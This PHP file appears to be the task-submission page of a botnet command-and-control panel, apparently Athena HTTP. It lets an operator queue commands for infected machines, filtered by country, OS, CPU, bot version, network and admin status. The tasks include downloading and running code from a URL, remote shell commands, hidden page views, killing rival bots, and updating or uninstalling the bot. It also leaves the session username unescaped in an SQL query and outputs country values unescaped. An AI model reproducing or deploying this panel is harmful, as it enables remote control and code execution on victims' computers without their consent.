<?php

	if(!defined('AthenaHTTP')) header('Location: ..');
	
	$STATUS_MESSAGE = 'Command launched.';
	$STATUS_NOTE = false;
	
	$PRIVCLASS1 = array('download', 'download.arguments', 'shell');
	$PRIVCLASS2 = array('view', 'view.hidden', 'smartview.add', 'smartview.del', 'smartview.clear');
	$PRIVCLASS3 = array('botkill.start', 'botkill.stop', 'botkill.once');
	$PRIVCLASS4 = array('download.update', 'uninstall');

	if($_POST['misc_task'])
	{
		$TASK 			= trim($_POST['misc_task']);
		$PARAM_URL 		= trim($_POST['misc_url']);
		$PARAM_COMMAND 		= trim($_POST['misc_command']);
		$PARAM_ARGS 		= trim($_POST['misc_args']);
		$PARAM_OPEN 		= trim($_POST['misc_open']);
		$PARAM_CLOSE 		= trim($_POST['misc_close']);
	
		$FILTER_COUNTRY 	= $_POST['filter_country'];
		$FILTER_OS 		= $_POST['filter_os'];
		$FILTER_CPU 		= $_POST['filter_cpu'];
		$FILTER_TYPE 		= $_POST['filter_type'];
		$FILTER_BOTVERSION 	= $_POST['filter_botversion'];
		$FILTER_NET 		= $_POST['filter_net'];
		$FILTER_ADMIN 		= $_POST['filter_admin'];
		$FILTER_AMOUNT		= $_POST['filter_amount'] > 0 && is_numeric($_POST['filter_amount']) ? trim($_POST['filter_amount']) : 0;
		$FILTER_BOTID		= $_POST['filter_botid'] ? trim($_POST['filter_botid']) : '*';
				
		$FILTER_COUNTRY_STR = '';
		$FILTER_OS_STR = '';
		$FILTER_CPU_STR = '';
		$FILTER_TYPE_STR = '';
		$FILTER_BOTVERSION_STR = '';
		$FILTER_NET_STR = '';
		$FILTER_ADMIN_STR = '';
		
		if(count($FILTER_COUNTRY) != 0)
		{
			foreach($FILTER_COUNTRY as $part) $FILTER_COUNTRY_STR .= $part . '|';
		}
		else
		{
			$FILTER_COUNTRY_STR = '*';
		}
		
		if(count($FILTER_OS) != 0)
		{
			foreach($FILTER_OS as $part) $FILTER_OS_STR .= $part . '|';
		}
		else
		{
			$FILTER_OS_STR = '*';
		}
		
		if(count($FILTER_CPU) != 0)
		{
			foreach($FILTER_CPU as $part) $FILTER_CPU_STR .= $part . '|';
		}
		else
		{
			$FILTER_CPU_STR = '*';
		}
		
		if(count($FILTER_TYPE) != 0)
		{
			foreach($FILTER_TYPE as $part) $FILTER_TYPE_STR .= $part . '|';
		}
		else
		{
			$FILTER_TYPE_STR = '*';
		}
		
		if(count($FILTER_BOTVERSION) != 0)
		{
			foreach($FILTER_BOTVERSION as $part) $FILTER_BOTVERSION_STR .= $part . '|';
		}
		else
		{
			$FILTER_BOTVERSION_STR = '*';
		}
		
		if(count($FILTER_NET) != 0)
		{
			foreach($FILTER_NET as $part) $FILTER_NET_STR .= $part . '|';
		}
		else
		{
			$FILTER_NET_STR = '*';
		}
		
		if(count($FILTER_ADMIN) != 0)
		{
			foreach($FILTER_ADMIN as $part) $FILTER_ADMIN_STR .= $part . '|';
		}
		else
		{
			$FILTER_ADMIN_STR = '*';
		}
		
		if($TASK == 'download' || $TASK == 'download.update' || $TASK == 'view' || $TASK == 'view.hidden' || $TASK == 'smartview.del') //url
		{
			if($PARAM_URL)
			{
				if($TASK == 'download' || $TASK == 'download.update')
				{
					$PARAM = $PARAM_URL . ' 1';
					$SUBMIT_TASK = true;
				}
				else
				{
					$PARAM = $PARAM_URL;
					$SUBMIT_TASK = true;
				}
			}
		}
		else if($TASK == 'download.arguments') //url & args
		{
			if($PARAM_URL && $PARAM_ARGS)
			{
				$PARAM = $PARAM_URL . ' 1 ' . $PARAM_ARGS;
				$SUBMIT_TASK = true;
			}
		}
		else if($TASK == 'smartview.add') //url & open & close
		{
			if($PARAM_URL && $PARAM_OPEN && $PARAM_CLOSE)
			{
				$PARAM = $PARAM_URL . ' ' . $PARAM_OPEN . ' ' . $PARAM_CLOSE;
				$SUBMIT_TASK = true;
			}
		}
		else if($TASK == 'smartview.clear' || $TASK == 'botkill.start' || $TASK == 'botkill.stop' || $TASK == 'botkill.once' || $TASK == 'uninstall') //none
		{
			$PARAM = '';
			$SUBMIT_TASK = true;
		}
		else if($TASK == 'shell') //command
		{
			$PARAM = $PARAM_COMMAND;
			$SUBMIT_TASK = true;
		}
		
		if($SUBMIT_TASK)
		{
			if((in_array($TASK, $PRIVCLASS1) && ($USERINFO['priv1'] || $USERINFO['admin'])) ||
			   (in_array($TASK, $PRIVCLASS2) && ($USERINFO['priv2'] || $USERINFO['admin'])) ||
			   (in_array($TASK, $PRIVCLASS3) && ($USERINFO['priv3'] || $USERINFO['admin'])) ||
			   (in_array($TASK, $PRIVCLASS4) && ($USERINFO['priv4'] || $USERINFO['admin'])))
			{
				mysql_query('INSERT INTO tasks SET ' . 
							'username=\'' . $_SESSION['username'] . '\', ' .
							'task=\'!' . mysql_real_escape_string($TASK) . '\', ' . 
							'parameter=\'' . mysql_real_escape_string($PARAM) . '\', ' . 
							'country=\'' . mysql_real_escape_string($FILTER_COUNTRY_STR) . '\', ' . 
							'os=\'' . mysql_real_escape_string($FILTER_OS_STR) . '\', ' . 
							'cpu=\'' . mysql_real_escape_string($FILTER_CPU_STR) . '\', ' . 
							'type=\'' . mysql_real_escape_string($FILTER_TYPE_STR) . '\', ' . 
							'version=\'' . mysql_real_escape_string($FILTER_BOTVERSION_STR) . '\', ' . 
							'net=\'' . mysql_real_escape_string($FILTER_NET_STR) . '\', ' . 
							'admin=\'' . mysql_real_escape_string($FILTER_ADMIN_STR) . '\', ' . 
							'busy=\'*\', ' . 
							'botid=\'' . mysql_real_escape_string($FILTER_BOTID) . '\', ' . 
							'`limit`=\'' . mysql_real_escape_string($FILTER_AMOUNT) . '\';');
							
				$STATUS_NOTE = true;
			}
		}
	}
	
	$PAGE_INCLUDE_FILTER_COUNTRY = '';
	$PAGE_INCLUDE_FILTER_OS = '';
	$PAGE_INCLUDE_FILTER_BOTVERSION = '';
	$PAGE_INCLUDE_FILTER_NET = '';
	
	$result = mysql_query('SELECT country FROM botlist WHERE 1 GROUP BY country;');
	while($row = mysql_fetch_array($result)) $PAGE_INCLUDE_FILTER_COUNTRY .= '								<option value="' . $row['country'] . '">' . $row['country'] . '</option>' . "\n";
	
	$result = mysql_query('SELECT os FROM botlist WHERE 1 GROUP BY os;');
	while($row = mysql_fetch_array($result)) $PAGE_INCLUDE_FILTER_OS .= '								<option value="' . htmlentities($row['os']) . '">' . htmlentities($row['os']) . '</option>' . "\n";
	
	$result = mysql_query('SELECT version FROM botlist WHERE 1 GROUP BY version;');
	while($row = mysql_fetch_array($result)) $PAGE_INCLUDE_FILTER_BOTVERSION .= '								<option value="' . htmlentities($row['version']) . '">' . htmlentities($row['version']) . '</option>' . "\n";
	
	$result = mysql_query('SELECT net FROM botlist WHERE 1 GROUP BY net;');
	while($row = mysql_fetch_array($result)) $PAGE_INCLUDE_FILTER_NET .= '								<option value="' . htmlentities($row['net']) . '">' . htmlentities($row['net']) . '</option>' . "\n";
?>